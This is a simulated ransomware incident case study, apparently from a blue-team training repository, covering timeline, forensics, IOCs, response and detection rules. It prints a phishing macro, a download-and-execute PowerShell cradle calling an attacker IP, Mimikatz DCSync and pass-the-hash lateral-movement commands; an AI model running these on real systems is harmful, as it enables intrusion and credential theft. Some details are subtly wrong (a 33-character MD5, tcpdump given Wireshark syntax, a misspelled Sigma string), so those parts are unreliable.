# Case Study: Ransomware Incident Investigation

> **Disclaimer:** This case study is based on a simulated incident for educational purposes. All identifiers have been anonymized.

---

## 📋 Case Overview

| Field | Details |
|-------|---------|
| **Incident Type** | Ransomware (LockBit variant) |
| **Organization** | Mid-size healthcare company (500 employees) |
| **Date** | March 15, 2024 |
| **Impact** | 12 servers encrypted, operations disrupted for 3 days |
| **Financial Impact** | ~$500,000 (ransom + downtime + recovery) |
| **Investigation Duration** | 2 weeks |

---

## 🔍 Executive Summary

A ransomware attack was detected at 02:34 AM when the security team received multiple alerts from the EDR solution. The attacker gained initial access through a phishing email containing a malicious macro, then laterally moved through the network using stolen credentials. The investigation identified the attack path, IOCs, and lessons learned.

---

## ⏰ Timeline of Events

| Time | Event |
|------|-------|
| **Day 1 - 14:30** | Employee opens phishing email, macro executes |
| **Day 1 - 14:45** | Cobalt Strike beacon established |
| **Day 1 - 15:00 to 18:00** | Credential dumping, lateral movement |
| **Day 1 - 20:00** | Domain admin credentials obtained |
| **Day 2 - 02:30** | Ransomware payload deployed |
| **Day 2 - 02:34** | EDR alerts triggered |
| **Day 2 - 02:45** | SOC analyst acknowledges alert |
| **Day 2 - 03:00** | Incident declared, response initiated |
| **Day 2 - 06:00** | Affected systems isolated |
| **Day 4 - 09:00** | Recovery begins |
| **Day 7 - 17:00** | Systems fully restored |

---

## 🔬 Investigation Process

### Phase 1: Detection & Alert Triage

**Initial Alert from EDR:**
```
Alert: Possible Ransomware Activity
Severity: Critical
Endpoint: HR-WS-04
Process: powershell.exe spawned encryptor.exe
Time: 2024-03-16 02:34:22 UTC
```

**SOC Analyst Initial Response:**
1. Verified alert authenticity
2. Checked if legitimate process (false positive check)
3. Confirmed malicious - process had no parent process info, running from temp
4. Created incident ticket in TheHive

### Phase 2: Evidence Collection

#### 2.1 EDR Timeline Export
```powershell
# Export process timeline for affected endpoint
Get-MDExtraction -DeviceId "hr-ws-04" -StartTime "2024-03-15T14:00:00Z" -EndTime "2024-03-16T04:00:00Z"
```

**Key Findings:**
- 14:30 - Excel.exe spawned powershell.exe
- 14:31 - PowerShell connected to suspicious IP
- 14:35 - Mimikatz execution detected
- 14:40 - LSASS access detected
- 15:00 - SMB connections to multiple servers

#### 2.2 Memory Forensics
```bash
# Acquire memory from HR-WS-04
winpmem_mini_x64.exe memory.raw

# Analyze with Volatility
vol -f memory.raw windows.pslist
vol -f memory.raw windows.malfind
vol -f memory.raw windows.netscan
```

**Key Findings:**
- Cobalt Strike beacon present in memory
- Network connections to: 185.234.219.10:4444
- Injected code in notepad.exe

#### 2.3 Network Traffic Analysis
```bash
# Analyze captured traffic
tcpdump -r incident.pcap -Y "tcp.flags.syn == 1" | head -20
```

**Key Findings:**
- Beaconing every 60 seconds to C2
- Large data transfers to suspicious IP
- SMB traffic to domain controllers

### Phase 3: Attack Path Reconstruction

```
Initial Access (Phishing)
     │
     ▼
┌─────────────┐
│ HR-WS-04   │ ── Macro executes PowerShell
└─────────────┘
     │
     ├──────────┐
     ▼          ▼
Credential     Lateral Movement
Dumping        (SMB)
     │          │
     ▼          ▼
┌─────────┐   ┌──────────────┐
│ LSASS  │   │ File-Server-01│
└─────────┘   └──────────────┘
     │          │
     ▼          ▼
Admin        Admin
Credentials  Access
     │          │
     └────┬─────┘
          ▼
    ┌─────────────┐
    │ Domain     │
    │ Controller │
    └─────────────┘
          │
          ▼
    ┌────────────────┐
    │ 12 Servers    │
    │ Encrypted     │
    └────────────────┘
```

### Phase 4: IOC Extraction

| Type | Indicator | Defanged |
|------|-----------|----------|
| **MD5** | a1b2c3d4e5f6789012345678901234567 | - |
| **C2 IP** | 185.234.219.10 | - |
| **C2 Domain** | lockbit-c2[.]xyz | lockbit-c2.xyz |
| **File Path** | C:\Users\jdoe\AppData\Local\Temp\update.ps1 | - |
| **Registry** | HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Update | - |
| **Scheduled Task** | WindowsUpdate | - |

---

## 🛠️ Technical Deep Dive

### How the Attack Happened

#### Step 1: Initial Access (Phishing)
```
From: HR Department <hr@company-update.xyz>
Subject: Urgent: Benefits Enrollment Deadline
Attachment: benefits_form.docm
```

The macro in benefits_form.docm:
```vba
Sub Document_Open()
    Dim cmd As String
    cmd = "powershell -enc JABjAGwA..."
    Shell cmd, vbHide
End Sub
```

Decoded PowerShell:
```powershell
IEX ((New-Object Net.WebClient).DownloadString('http://185.234.219.10/update.ps1'))
```

#### Step 2: Beacon Setup
The downloaded script installed Cobalt Strike beacon:
```powershell
# Beacon configuration
$beacon = "http://185.234.219.10/abc"
$key = "AES128Key"
# Establish C2 connection
```

#### Step 3: Credential Dumping
Using Mimikatz:
```
privilege::debug
sekurlsa::logonpasswords
lsadump::dcsync /domain:corp.local /user:Administrator
```

#### Step 4: Lateral Movement
```
# Using CrackMapExec
crackmapexec smb 192.168.1.0/24 -u administrator -H [NTLMHASH]

# Using WMI
wmic /node:file-server-01 process call create "powershell -enc ..."
```

#### Step 5: Persistence
- Added registry run key
- Created scheduled task
- Modified SMB signing

#### Step 6: Ransomware Deployment
```
# LockBit 3.0 deployment
start.bat -> encryptor.exe -> key generation -> encryption
```

---

## ✅ Response Actions

### Containment (First 4 Hours)

| Action | Time | Status |
|--------|------|--------|
| Isolated affected endpoint | 03:00 | ✅ |
| Blocked C2 at firewall | 03:15 | ✅ |
| Disabled compromised accounts | 03:30 | ✅ |
| Blocked malicious domain/IP | 03:45 | ✅ |
| Enabled LDAP signing | 04:00 | ✅ |

### Eradication (Days 1-3)

```powershell
# Remove scheduled task
schtasks /delete /tn WindowsUpdate /f

# Remove registry key
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update"

# Reimage affected endpoints
# Deploy fresh Windows images

# Reset all privileged passwords
# Reset domain admin passwords
```

### Recovery (Days 4-7)

1. Restored from clean backups (verified unencrypted)
2. Patched all vulnerabilities
3. Re-enabled SMB signing
4. Monitored for re-infection

---

## 📊 Lessons Learned

### What Went Wrong

| Issue | Impact | Root Cause |
|-------|--------|------------|
| No email filtering for .docm | Initial access | Legacy email gateway |
| No EDR on some servers | Slow detection | Budget constraints |
| Weak password policy | Credential reuse | Policy not enforced |
| No network segmentation | Lateral movement | Flat network |
| Delayed backup restoration | 3 day downtime | Backup testing needed |

### What Went Right

| Action | Result |
|--------|--------|
| EDR triggered alert | Fast detection |
| SOC responded quickly | Limited spread |
| Backups were clean | Recovery possible |
| Communication was clear | Stakeholders informed |

### Recommendations

**Immediate (0-30 days):**
- [ ] Block .docm attachments at email gateway
- [ ] Deploy EDR to all endpoints
- [ ] Reset all privileged credentials
- [ ] Enable multi-factor authentication

**Short-term (30-90 days):**
- [ ] Implement network segmentation
- [ ] Deploy honeypot accounts
- [ ] Conduct phishing simulation
- [ ] Test backup restoration

**Long-term (90+ days):**
- [ ] Zero trust architecture
- [ ] SIEM integration
- [ ] Purple team exercises
- [ ] Security awareness program

---

## 🔏 Detection Rules

### Sigma Rule (EDR)
```yaml
title: LockBit Ransomware Indicators
id: 2024-0001
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains:
      - 'vssadmin delete shadowes'
      - 'cipher /w:'
      - 'icacls /grant Everyone'
  condition: selection
level: critical
```

### YARA Rule
```yara
rule LockBit_3_0_Encryption
{
    meta:
        author = "Blue Team Labs"
        description = "Detects LockBit 3.0 ransomware"
    strings:
        $s1 = "LockBit 3.0" nocase
        $s2 = ".LOCKBIT" nocase
        $s3 = "Your files are encrypted" nocase
    condition:
        2 of them
}
```

---

## 📝 Interview Questions from This Case

**Q: How would you investigate a ransomware alert?**
> A: First, verify if the alert is a false positive by checking the process context. Then, isolate the affected system immediately to prevent spread. Next, gather evidence including EDR timeline, memory dump, and network capture. Finally, identify the attack vector and IOCs for containment.

**Q: What would you do in the first hour of a ransomware incident?**
> A: 1) Verify the alert, 2) Isolate affected systems, 3) Block C2 communication, 4) Identify patient zero, 5) Begin evidence collection, 6) Notify stakeholders.

**Q: How do you determine if lateral movement occurred?**
> A: Look for SMB connections to other hosts, WMI/PowerShell remoting, scheduled tasks on remote systems, and login events (4624) from compromised accounts to other machines.

---

## 🔗 Related Labs

| Lab | Skills Demonstrated |
|-----|---------------------|
| [Lab 01 - Brute Force](../01-bruteforce/README.md) | Log analysis, attack detection |
| [Lab 06 - Phishing Investigation](../06-phishing-investigation/README.md) | Email analysis, IOC extraction |
| [Lab 09 - Malware Sandbox](../09-malware-analysis/README.md) | Malware analysis |
| [Lab 10 - Incident Response](../10-incident-response/README.md) | IR process |
| [Lab 11 - Threat Hunting](../11-threat-hunting/README.md) | MITRE ATT&CK |

---

## 📚 References

- [LockBit 3.0 Analysis](https://www.secureworks.com/blog/lockbit-3-0)
- [MITRE ATT&CK: Ransomware](https://attack.mitre.org/techniques/T1486/)
- [SANS IR Guide](https://www.sans.org/security-resources/incident-response/)

---

**Case Study Version:** 1.0
**Last Updated:** 2024-03-20

**Back to:** [Main README](README.md)